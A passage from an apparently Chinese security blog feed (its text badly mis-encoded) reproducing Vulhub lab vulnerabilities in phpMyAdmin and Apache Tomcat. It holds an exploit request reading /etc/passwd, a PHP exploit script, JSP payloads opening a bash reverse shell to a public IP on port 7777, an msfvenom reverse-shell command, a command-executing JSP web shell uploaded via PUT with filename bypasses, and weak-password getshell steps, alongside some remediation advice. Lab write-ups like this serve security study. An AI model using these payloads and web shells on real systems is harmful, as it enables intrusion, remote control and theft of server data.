class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/scripts/setup.php</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: your-ip:8080</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span>: */*</span><br><span class="line"><span class="attribute">Accept-Language</span>: en</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 80</span><br><span class="line"></span><br><span class="line">action=test&amp;configuration=O:10:&quot;PMA_Config&quot;:1:&#123;s:6:&quot;source&quot;,s:11:&quot;/etc/passwd&quot;;&#125;</span><br></pre></td></tr></table></figure><p>è¿˜æœ‰ä¸ªæ›´ç®€å•çš„exp:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PMA_Config</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $source;</span><br><span class="line">&#125;</span><br><span class="line">$t = <span class="keyword">new</span> PMA_Config();</span><br><span class="line">$t -&gt; source = $_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">$str = serialize($t);</span><br><span class="line">$url = $_GET[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">$data = <span class="string">&quot;configuration=&quot;</span>.$str.<span class="string">&quot;&amp;action=test&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> $data;</span><br><span class="line">$ch = curl_init();</span><br><span class="line">curl_setopt($ch,CURLOPT_URL,$url);</span><br><span class="line">curl_setopt($ch, CURLOPT_HEADER, <span class="literal">false</span>);</span><br><span class="line">curl_setopt($ch, CURLOPT_POST,<span class="literal">true</span>);</span><br><span class="line">curl_setopt($ch, CURLOPT_POSTFIELDS, $data);</span><br><span class="line">curl_setopt($ch, CURLOPT_RETURNTRANSFER,<span class="literal">true</span>);</span><br><span class="line"><span class="keyword">echo</span> curl_exec($ch); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>Getshell</strong></p><ul><li><strong>åˆ©ç”¨æ–¹å¼ä¸€</strong></li></ul><p>ä½†æ˜¯ç»è¿‡åˆ†æè¿™ä¸ªæ¼æ´æ˜¯ä¸èƒ½è¯»å–phpæ–‡ä»¶çš„ï¼Œå› ä¸ºæœ‰äº†eval()ï¼Œç›¸å½“äºä»»æ„æ–‡ä»¶åŒ…å«äº†ï¼Œä¸è¿‡å¦ä¸€æ–¹é¢è¿™ä¹Ÿæ˜¯æœ‰å¥½å¤„çš„ï¼Œå¦‚æœèƒ½å†™å…¥æ–‡ä»¶ï¼Œæ–‡ä»¶ä¸­åŒ…å«ä¸€ä¸ªä¸€å¥è¯å°±å¯ä»¥ç›´æ¥getshelläº†ã€‚ä½œè€…ç»™çš„æ–¹å¼æ˜¯ç”¨error logã€‚</p><p>æ ¹æ®ä½œè€…çš„æ–¹æ³•ï¼Œä½¿ç”¨é»˜è®¤ç¯å¢ƒï¼Œæ‰å‘ç°æœ‰ç‚¹é¸¡è‚‹ï¼Œæ¯”å¦‚ï¼Œåœ¨ubuntuä¸‹ï¼Œä¸€èˆ¬æ˜¯ä¸å…è®¸ç”¨rootæƒé™è¿è¡Œï¼Œå®é™…æµ‹è¯•ä¸­ï¼Œæˆ‘ä»¬æ˜¯æ— æ³•è¯»å–access.logçš„ï¼Œæ‰€ä»¥getshellå°±æ¯”è¾ƒå›°éš¾ã€‚åœ¨windowsä¸‹ï¼Œç”±äºå‡ ä¹æ‰€æœ‰çš„æµè§ˆå™¨å’Œpythonæ¨¡å—éƒ½ä¼šå¾ˆâ€œè‡ªè§‰åœ°â€å°†ç‰¹æ®Šå­—ç¬¦ç¼–ç è¿›è¡Œè½¬æ¢â€ï¼Œgetshellå°±æ›´å›°éš¾äº†ï¼Œæ‰€ä»¥åªèƒ½ç”¨socketå»æ„é€ shellã€‚</p><img src="/2020/03/07/Vulhub%E4%B9%8Bphpmyadmin/3231664811.png" style="zoom:80%;"><p>Access logä¸­å°±å‡ºç°äº†shelläº†ã€‚</p><p><img src="/2020/03/07/Vulhub%E4%B9%8Bphpmyadmin/301598339.png"></p><p>å†ç”¨ä»»æ„æ–‡ä»¶åŒ…å«æ¼æ´å»åŒ…å«ï¼Œå°±å¯ä»¥æ‹¿åˆ°shelläº†ã€‚</p><ul><li><strong>åˆ©ç”¨æ–¹å¼äºŒ</strong></li></ul><p>expä¿®æ”¹ä¸ºå¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PMA_Config</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $source = <span class="string">&#x27;ftp://admin:admin@127.0.0.1/phpinfo.txt&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> PMA_Config();</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br></pre></td></tr></table></figure><p>é€šè¿‡FTPç›´æ¥è¿œç¨‹åˆ©ç”¨è·å–shell</p><p>å‰ææ˜¯çœ‹<code>allow_url_fopen</code>ï¼ˆé»˜è®¤æ˜¯å¼€å¯çš„ï¼‰</p><p><img src="/2020/03/07/Vulhub%E4%B9%8Bphpmyadmin/TIM%E6%88%AA%E5%9B%BE20200309112457.png"></p><p>å‚è€ƒï¼š</p><p><a href="https://larry.ngrep.me/2016/09/21/cve-2016-5734-analysis/">https://larry.ngrep.me/2016/09/21/cve-2016-5734-analysis/</a></p><p><a href="https://rj45mp.github.io/phpMyAdmin-WooYun-2016-199433/">https://rj45mp.github.io/phpMyAdmin-WooYun-2016-199433/</a></p><p><a href="http://www.polaris-lab.com/index.php/archives/66/">http://www.polaris-lab.com/index.php/archives/66/</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> å¤ç° </tag>
            
            <tag> Vulhub </tag>
            
            <tag> phpmyadmin </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulhubä¹‹tomcat</title>
      <link href="2020/03/06/Vulhub%E4%B9%8Btomcat/"/>
      <url>2020/03/06/Vulhub%E4%B9%8Btomcat/</url>
      
        <content type="html"><![CDATA[<p>æœ¬ç¯‡åšå®¢ä¸»è¦ä»‹ç»äº†Vulhubä¸Štomcatçš„æ¼æ´å¤ç°ï¼Œæœ‰ä¸ªè¿˜çƒ­ä¹çš„ğŸ¤­ï¼</p><a id="more"></a><h2 id="CVE-2020-1938"><a href="#CVE-2020-1938" class="headerlink" title="CVE-2020-1938"></a>CVE-2020-1938</h2><h3 id="æ¼æ´ç®€ä»‹"><a href="#æ¼æ´ç®€ä»‹" class="headerlink" title="æ¼æ´ç®€ä»‹"></a>æ¼æ´ç®€ä»‹</h3><p>2020å¹´2æœˆ20æ—¥ï¼Œå›½å®¶ä¿¡æ¯å®‰å…¨æ¼æ´å…±äº«å¹³å°ï¼ˆCNVDï¼‰å‘å¸ƒäº†Apache Tomcatæ–‡ä»¶åŒ…å«æ¼æ´ï¼ˆCNVD-2020-10487/CVE-2020-1938ï¼‰ã€‚è¯¥æ¼æ´æ˜¯ç”±äºTomcat AJPåè®®å­˜åœ¨ç¼ºé™·è€Œå¯¼è‡´ï¼Œæ”»å‡»è€…åˆ©ç”¨è¯¥æ¼æ´å¯é€šè¿‡æ„é€ ç‰¹å®šå‚æ•°ï¼Œè¯»å–æœåŠ¡å™¨webappä¸‹çš„ä»»æ„æ–‡ä»¶ã€‚</p><h3 id="å½±å“èŒƒå›´"><a href="#å½±å“èŒƒå›´" class="headerlink" title="å½±å“èŒƒå›´"></a>å½±å“èŒƒå›´</h3><p><strong>å—å½±å“ç‰ˆæœ¬</strong></p><ul><li>Apache Tomcat 6</li><li>Apache Tomcat 7 &lt; 7.0.100</li><li>Apache Tomcat 8 &lt; 8.5.51</li><li>Apache Tomcat 9 &lt; 9.0.31</li></ul><h3 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h3><p>å…ˆæŠŠç¯å¢ƒæ­å¥½</p><img src="/2020/03/06/Vulhub%E4%B9%8Btomcat/TIMæˆªå›¾20200306230541.png" style="zoom:80%;"><p>æ¼æ´EXPåœ°å€(Python)ï¼š<a href="https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi/[](https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi/)">https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi/[](https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi/)</a></p><p>tomcatçš„ç½‘ç«™ä»£ç é»˜è®¤ç›®å½•æ”¾åœ¨<code>webapps/ROOT</code></p><img src="/2020/03/06/Vulhub%E4%B9%8Btomcat/TIMæˆªå›¾20200306231251.png" style="zoom:80%;"><p>AJpçš„é»˜è®¤ç«¯å£æ˜¯8009ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨nmapæ¢æµ‹ä»¥ä¸‹æœåŠ¡</p><img src="/2020/03/06/Vulhub%E4%B9%8Btomcat/TIMæˆªå›¾20200306232256.png" style="zoom:80%;"><p>æˆ‘ä»¬è¯•ç€è¯»å–<code>WEB-INF/web.xml</code>æ–‡ä»¶</p><img src="/2020/03/06/Vulhub%E4%B9%8Btomcat/TIMæˆªå›¾20200306231634.png" style="zoom:80%;"><p>æ—¢ç„¶æ˜¯æ–‡ä»¶åŒ…å«ï¼Œèƒ½æ§åˆ¶æ–‡ä»¶å†…å®¹çš„è¯å°±å¯ä»¥rceå•Š</p><p>rce exp:<a href="https://github.com/00theway/Ghostcat-CNVD-2020-10487">https://github.com/00theway/Ghostcat-CNVD-2020-10487</a></p><p>æˆ‘ä»¬å…ˆæ§åˆ¶æ–‡ä»¶å†…å®¹ä¸º</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;% Runtime.getRuntime().exec(<span class="string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny45Ny4yMTAuMTQxLzc3NzcgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>);%&gt;</span><br></pre></td></tr></table></figure><p>ä¸ºå•¥ä¸èƒ½ç›´æ¥ç”¨ä¸‹é¢çš„è¿™æˆ‘ä¹Ÿä¸æ¸…æ¥š</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;% Runtime.getRuntime().exec(<span class="string">&quot;bash -i &gt;&amp; /dev/tcp/47.97.210.141/7777 0&gt;&amp;1&quot;</span>);%&gt;</span><br></pre></td></tr></table></figure><p>å¯ä»¥ç”¨è¿™ä¸ªåœ¨çº¿ç½‘ç«™ç”Ÿæˆbase64é‚£æ®µï¼š<a href="http://www.jackson-t.ca/runtime-exec-payloads.html">http://www.jackson-t.ca/runtime-exec-payloads.html</a></p><img src="/2020/03/06/Vulhub%E4%B9%8Btomcat/TIMæˆªå›¾20200328114101.png" style="zoom:80%;"><p>ç„¶åå°±å¯ä»¥åŒ…å«äº†</p><img src="/2020/03/06/Vulhub%E4%B9%8Btomcat/TIMæˆªå›¾20200328114531.png" style="zoom:80%;"><p>å½“ç„¶ä¹Ÿå¯ä»¥ç”¨msfç”Ÿæˆå’Œåé—¨</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=4444 &gt; shell.txt</span><br></pre></td></tr></table></figure><h3 id="ä¿®å¤æ„è§"><a href="#ä¿®å¤æ„è§" class="headerlink" title="ä¿®å¤æ„è§"></a>ä¿®å¤æ„è§</h3><h4 id="å…³é—­AJp"><a href="#å…³é—­AJp" class="headerlink" title="å…³é—­AJp"></a>å…³é—­AJp</h4><p>ç¼–è¾‘ <code>&lt;CATALINA_BASE&gt;/conf/server.xml</code>ï¼Œæ‰¾åˆ°å¦‚ä¸‹è¡Œï¼ˆ<CATALINA_BASE> ä¸º Tomcat çš„å·¥ä½œç›®å½•ï¼‰ï¼š</CATALINA_BASE></p><img src="/2020/03/06/Vulhub%E4%B9%8Btomcat/TIMæˆªå›¾20200306233614.png" style="zoom:80%;"><p>å°†æ­¤è¡Œæ³¨é‡Šæ‰ï¼ˆä¹Ÿå¯åˆ æ‰è¯¥è¡Œ)</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--&lt;Connectorport=&quot;8009&quot; protocol=&quot;AJP/1.3&quot;redirectPort=&quot;8443&quot; /&gt;--&gt;</span></span><br></pre></td></tr></table></figure><p>ä¿å­˜åéœ€é‡æ–°å¯åŠ¨Tomcatï¼Œè§„åˆ™æ–¹å¯ç”Ÿæ•ˆã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /usr/<span class="built_in">local</span>/tomcat/bin</span><br><span class="line">./shutdown.sh</span><br><span class="line">./startup.sh</span><br></pre></td></tr></table></figure><h4 id="ä¸å…³é—­AJp"><a href="#ä¸å…³é—­AJp" class="headerlink" title="ä¸å…³é—­AJp"></a>ä¸å…³é—­AJp</h4><p>æœ€ç®€å•çš„å°±æ˜¯æ›´æ–°è‡³æœ€æ–°ç‰ˆæœ¬</p><p>å¦‚æœæ— æ³•æ›´æ–°æˆ‘ä»¬å¯ä»¥æŒ‰ç…§ä¸‹é¢çš„æ“ä½œ</p><p>ä½¿ç”¨Tomcat 7å’ŒTomcat 9çš„ç”¨æˆ·å¯ä¸ºAJP Connectoré…ç½®secretæ¥è®¾ç½®AJPåè®®çš„è®¤è¯å‡­è¯ã€‚ä¾‹å¦‚ï¼Œå°†YOUR_TOMCAT_AJP_SECRETæ›´æ”¹ä¸ºä¸€ä¸ªå®‰å…¨æ€§é«˜ã€æ— æ³•è¢«è½»æ˜“çŒœè§£çš„å€¼</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Connector</span> <span class="attr">port</span>=<span class="string">&quot;8009&quot;</span> <span class="attr">protocol</span>=<span class="string">&quot;AJP/1.3&quot;</span> <span class="attr">redirectPort</span>=<span class="string">&quot;8443&quot;</span> <span class="attr">address</span>=<span class="string">&quot;YOUR_TOMCAT_IP_ADDRESS&quot;</span> <span class="attr">secret</span>=<span class="string">&quot;YOUR_TOMCAT_AJP_SECRET&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure><p>ä½¿ç”¨Tomcat 8çš„ç”¨æˆ·å¯ä¸ºAJP Connectoré…ç½®requiredSecretæ¥è®¾ç½®AJPåè®®çš„è®¤è¯å‡­è¯ã€‚ä¾‹å¦‚ï¼Œå°†YOUR_TOMCAT_AJP_SECRETæ›´æ”¹ä¸ºä¸€ä¸ªå®‰å…¨æ€§é«˜ã€æ— æ³•è¢«è½»æ˜“çŒœè§£çš„å€¼</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Connector</span> <span class="attr">port</span>=<span class="string">&quot;8009&quot;</span> <span class="attr">protocol</span>=<span class="string">&quot;AJP/1.3&quot;</span> <span class="attr">redirectPort</span>=<span class="string">&quot;8443&quot;</span> <span class="attr">address</span>=<span class="string">&quot;YOUR_TOMCAT_IP_ADDRESS&quot;</span> <span class="attr">requiredSecret</span>=<span class="string">&quot;YOUR_TOMCAT_AJP_SECRET&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure><p>æ›´æ”¹ä¹‹åé‡å¯</p><h2 id="CVE-2017-12615"><a href="#CVE-2017-12615" class="headerlink" title="CVE-2017-12615"></a>CVE-2017-12615</h2><h3 id="æ¼æ´ç®€ä»‹-1"><a href="#æ¼æ´ç®€ä»‹-1" class="headerlink" title="æ¼æ´ç®€ä»‹"></a>æ¼æ´ç®€ä»‹</h3><p>å½“ Tomcat è¿è¡Œåœ¨ Windows æ“ä½œç³»ç»Ÿæ—¶ï¼Œä¸”å¯ç”¨äº† HTTP PUT è¯·æ±‚æ–¹æ³•ï¼ˆä¾‹å¦‚ï¼Œå°† readonly åˆå§‹åŒ–å‚æ•°ç”±é»˜è®¤å€¼è®¾ç½®ä¸º falseï¼‰ï¼Œæ”»å‡»è€…å°†æœ‰å¯èƒ½å¯é€šè¿‡ç²¾å¿ƒæ„é€ çš„æ”»å‡»è¯·æ±‚æ•°æ®åŒ…å‘æœåŠ¡å™¨ä¸Šä¼ åŒ…å«ä»»æ„ä»£ç çš„ JSP æ–‡ä»¶ï¼ŒJSPæ–‡ä»¶ä¸­çš„æ¶æ„ä»£ç å°†èƒ½è¢«æœåŠ¡å™¨æ‰§è¡Œã€‚å¯¼è‡´æœåŠ¡å™¨ä¸Šçš„æ•°æ®æ³„éœ²æˆ–è·å–æœåŠ¡å™¨æƒé™ã€‚</p><p>åœ¨<code>config/web.xml</code>é‡Œï¼Œåœ¨å…¶ä¸­æ‰¾åˆ°default servletçš„é…ç½®é¡¹é‡Œå¢åŠ ä¸‹é¢ä¸€æ®µä»£ç ï¼Œå³å°†readonlyè®¾ç½®æˆfalseï¼Œä¾¿å¯ä»¥é€šè¿‡PUT/DELETEè¿›è¡Œæ–‡ä»¶æ“æ§ï¼Œè§¦å‘æ¼æ´</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">param-name</span>&gt;</span>readonly<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>false<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="å½±å“èŒƒå›´-1"><a href="#å½±å“èŒƒå›´-1" class="headerlink" title="å½±å“èŒƒå›´"></a>å½±å“èŒƒå›´</h3><p>å—å½±å“ç‰ˆæœ¬ï¼šApache Tomcat 7.0.0 - 7.0.79 (windowsç¯å¢ƒ)</p><h3 id="æ¼æ´å¤ç°-1"><a href="#æ¼æ´å¤ç°-1" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h3><p>æ‡’å¾—è£…ä¸ªtomcatäº†ï¼Œç›´æ¥ç”¨dockerå§</p><p>æˆ‘ä»¬ç›´æ¥å‘ä¸ªpostè¯·æ±‚ï¼ŒburpæŠ“åŒ…ï¼Œå°†POSTæ”¹æˆPUTï¼Œä¸Šä¼ ä¸€ä¸ªshell</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    <span class="keyword">if</span>(<span class="string">&quot;023&quot;</span>.equals(request.getParameter(<span class="string">&quot;pwd&quot;</span>)))&#123;</span><br><span class="line">        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(<span class="string">&quot;i&quot;</span>)).getInputStream();</span><br><span class="line">        <span class="keyword">int</span> a = -<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">byte</span>[] b = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">2048</span>];</span><br><span class="line">        out.print(<span class="string">&quot;&lt;pre&gt;&quot;</span>);</span><br><span class="line">        <span class="keyword">while</span>((a=in.read(b))!=-<span class="number">1</span>)&#123;</span><br><span class="line">            out.println(<span class="keyword">new</span> String(b));</span><br><span class="line">        &#125;</span><br><span class="line">        out.print(<span class="string">&quot;&lt;/pre&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><img src="/2020/03/06/Vulhub%E4%B9%8Btomcat/TIMæˆªå›¾20200307220651.png" style="zoom:80%;"><p>å¯ä»¥çœ‹åˆ°å·²ç»ä¸Šä¼ æˆåŠŸ</p><img src="/2020/03/06/Vulhub%E4%B9%8Btomcat/TIMæˆªå›¾20200307220929.png" style="zoom:80%;"><p>default servletåªèƒ½å¤„ç†é™æ€æ–‡ä»¶ï¼Œè€Œå¤„ç†jspæ–‡ä»¶æ˜¯jspservletï¼Œä½†æ˜¯åªæœ‰defaultservletæœ‰PUTä¸Šä¼ é€»è¾‘ï¼Œè§£å†³çš„åŠæ³•æ˜¯é€šè¿‡æ„é€ ç‰¹æ®Šçš„åç¼€åæ¥è¿›è¡Œç»•è¿‡ï¼Œä»è€Œä¸Šä¼ jspæœ¨é©¬ã€‚</p><p><strong>Windowsï¼š</strong></p><ul><li><code>shell.jsp%20</code></li><li><code>shell.jsp::$DATA</code></li><li><code>shell.jsp/</code></li><li><code>shell.jsp/.</code></li></ul><p><strong>Linuxï¼š</strong></p><ul><li><code>shell.jsp/</code></li><li><code>shell.jsp/.</code></li></ul><p>å¦‚æœæƒ³çŸ¥é“æŸä¸ªç«™ç‚¹æ”¯æŒå“ªäº›è¯·æ±‚æ–¹å¼çš„è¯ï¼Œå¯ä»¥ç”¨nmap+script</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 47.97.210.141 -p 8080 --script http-methods -sV</span><br></pre></td></tr></table></figure><img src="/2020/03/06/Vulhub%E4%B9%8Btomcat/TIMæˆªå›¾20200307222351.png" style="zoom:80%;"><h3 id="ä¿®å¤æ„è§-1"><a href="#ä¿®å¤æ„è§-1" class="headerlink" title="ä¿®å¤æ„è§"></a>ä¿®å¤æ„è§</h3><p>å°†readonlyçš„é…ç½®æ”¹ä¸ºtrue</p><h2 id="Tomcatåå°å¼±å£ä»¤getshell"><a href="#Tomcatåå°å¼±å£ä»¤getshell" class="headerlink" title="Tomcatåå°å¼±å£ä»¤getshell"></a>Tomcatåå°å¼±å£ä»¤getshell</h2><h3 id="æ¼æ´ç®€ä»‹-2"><a href="#æ¼æ´ç®€ä»‹-2" class="headerlink" title="æ¼æ´ç®€ä»‹"></a>æ¼æ´ç®€ä»‹</h3><p>å…ˆä»‹ç»ä¸€ä¸‹tomcatçš„åå°ç®¡ç†ï¼Œç¯å¢ƒæ­å¥½åï¼Œè®¿é—®å‘ç°</p><img src="/2020/03/06/Vulhub%E4%B9%8Btomcat/TIMæˆªå›¾20200307224945.png" style="zoom:80%;"><p>å‘ç°ä¸‰ä¸ªæŒ‰é’®ï¼š<code>Server Status</code>,<code>Manager App</code>,<code>Host Manager</code></p><p>åˆ†åˆ«è¡¨ç¤ºè¿›å…¥æœåŠ¡å™¨çŠ¶æ€ï¼Œç®¡ç†æœåŠ¡å™¨ä¸Šéƒ¨ç½²çš„åº”ç”¨ï¼Œç®¡ç†ä¸»æœºç•Œé¢</p><p>åœ¨é»˜è®¤æƒ…å†µä¸‹ï¼Œtomcatçš„é…ç½®æ–‡ä»¶é‡Œæ²¡æœ‰è§’è‰²ï¼Œå› ä¸ºåœ¨tomcatçš„confæ–‡ä»¶å¤¹ä¸‹çš„tomcat-users.xmlæ–‡ä»¶ä¸­ï¼Œç”¨æˆ·æ˜¯è¢«æ³¨é‡Šæ‰çš„ã€‚</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">Â  &lt;role rolename=&quot;tomcat&quot;/&gt;</span></span><br><span class="line"><span class="comment">Â  &lt;role rolename=&quot;role1&quot;/&gt;</span></span><br><span class="line"><span class="comment">Â  &lt;user username=&quot;tomcat&quot; password=&quot;tomcat&quot; roles=&quot;tomcat&quot;/&gt;</span></span><br><span class="line"><span class="comment">Â  &lt;user username=&quot;both&quot; password=&quot;tomcat&quot; roles=&quot;tomcat,role1&quot;/&gt;</span></span><br><span class="line"><span class="comment">Â  &lt;user username=&quot;role1&quot; password=&quot;tomcat&quot; roles=&quot;role1&quot;/&gt;</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br></pre></td></tr></table></figure><p>æ‰€ä»¥ç‚¹å‡»ä¸‰ä¸ªä¸­ä»»æ„ä¸€ä¸ªæŒ‰é’®ï¼Œä¼šè·³è½¬åˆ°ä¸€ä¸ªæ‹’ç»çš„ç•Œé¢</p><p>åœ¨<code>tomcat-users.xml</code>åŠ å…¥ä¸‹é¢çš„roleï¼Œå†åˆ›å»ºä¸€ä¸ªuserï¼Œé‡å¯æœåŠ¡å™¨è¾“å…¥ä¸‹é¢åˆ›å»ºçš„ç”¨æˆ·åå’Œå¯†ç å°±å¯ä»¥è¿›å…¥ç®¡ç†é¡µé¢äº†</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">role</span>Â <span class="attr">rolename</span>=<span class="string">&quot;manager-gui&quot;</span>/&gt;</span>Â  //å¯¹åº”ç¬¬äºŒä¸ªæŒ‰é’®æƒé™</span><br><span class="line"><span class="tag">&lt;<span class="name">role</span>Â <span class="attr">rolename</span>=<span class="string">&quot;admin-gui&quot;</span>/&gt;</span>Â Â //å¯¹åº”ç¬¬ä¸‰ä¸ªæŒ‰é’®æƒé™</span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>Â <span class="attr">username</span>=<span class="string">&quot;admin&quot;</span>Â <span class="attr">password</span>=<span class="string">&quot;admin&quot;</span>Â <span class="attr">roles</span>=<span class="string">&quot;manager-gui,admin-gui&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure><p>å¦‚æœè®¾ç½®çš„è´¦å·å¯†ç æ˜¯å¼±å£ä»¤çš„è¯ï¼Œå°±å¯ä»¥ç™»é™†åå°è¿›ä¸€æ­¥getshell</p><h3 id="æ¼æ´å¤ç°-2"><a href="#æ¼æ´å¤ç°-2" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h3><p>ç›´æ¥ç‚¹å‡»å…¶ä¸­ä¸€ä¸ªï¼Œå‘ç°è¦è¾“è´¦å·å¯†ç </p><img src="/2020/03/06/Vulhub%E4%B9%8Btomcat/TIMæˆªå›¾20200307230634.png" style="zoom:80%;"><p>æˆ‘ä»¬å°è¯•burpæŠ“åŒ…ï¼Œè¿›è¡Œçˆ†ç ´ï¼Œè¿™é‡Œçš„è´¦å·å¯†ç éƒ½æ˜¯tomcat</p><p>è¿›å…¥<code>Manager App</code>é¡µé¢ï¼Œå‘ç°å¯ä»¥ä¸Šä¼ æ–‡ä»¶(waråŒ…)ä»¥åŠç›®å½•æ˜¾ç¤º</p><img src="/2020/03/06/Vulhub%E4%B9%8Btomcat/TIMæˆªå›¾20200307231034.png" style="zoom:80%;"><p>war åŒ…æ˜¯ä¸€ç§æ‰“åŒ…æ ¼å¼ï¼ŒJava webå·¥ç¨‹ï¼Œéƒ½æ˜¯æ‰“æˆwaråŒ…ï¼Œè¿›è¡Œå‘å¸ƒï¼Œæ‰“æˆwaråŒ…çš„å¥½å¤„æ˜¯ä¸ä¼šç¼ºå°‘ç›®å½•ï¼Œå¹¶ä¸”åªç®¡ç†å¥½ä¸€ä¸ªå‘å¸ƒæ–‡ä»¶å°±å¥½ï¼Œå¹¶ä¸”tomcatæœåŠ¡å™¨èƒ½å¤Ÿè‡ªåŠ¨è¯†åˆ«ï¼Œå°†waråŒ…æ”¾åœ¨tomcatå®¹å™¨çš„webappsä¸‹ï¼Œå¯åŠ¨æœåŠ¡ï¼Œå³å¯è¿è¡Œè¯¥é¡¹ç›®ï¼Œè¯¥waråŒ…ä¼šè‡ªåŠ¨è§£å‹å‡ºä¸€ä¸ªåŒåçš„æ–‡ä»¶å¤¹ã€‚</p><p>ç›´æ¥å¯ä»¥åœ¨cmdé‡Œç”Ÿæˆ(æœ‰javaç¯å¢ƒ)</p><figure class="highlight shell"><table><tr><td 